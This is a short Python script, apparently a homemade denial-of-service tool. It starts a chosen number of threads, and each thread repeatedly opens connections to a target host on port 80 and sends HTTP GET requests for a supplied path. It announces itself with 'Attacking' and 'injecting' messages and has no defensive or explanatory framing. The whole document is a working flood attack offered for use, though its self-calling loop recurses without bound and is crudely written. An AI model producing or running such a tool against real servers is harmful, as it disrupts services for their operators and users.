import socket, sys, os, threading, time

print("][ Attacking " + sys.argv[1] + " ... ][")
print("injecting " + sys.argv[2])
global level
level = sys.argv[3]


def attack():
    # pid = os.fork()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1], 80))
        print(">> GET /" + sys.argv[2] + " HTTP/1.1")
        s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")
        s.send("Host: " + sys.argv[1] + "\r\n\r\n")
        s.close()
    except:
        print(">> Socket Dead.")
    for x in range(1, 2000):
        time.sleep(0.009)  # So it doesnt break after going to fast
        attack()


def threader():
    global threads
    threads = []
    for i in range(1, int(level)):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()


threader()
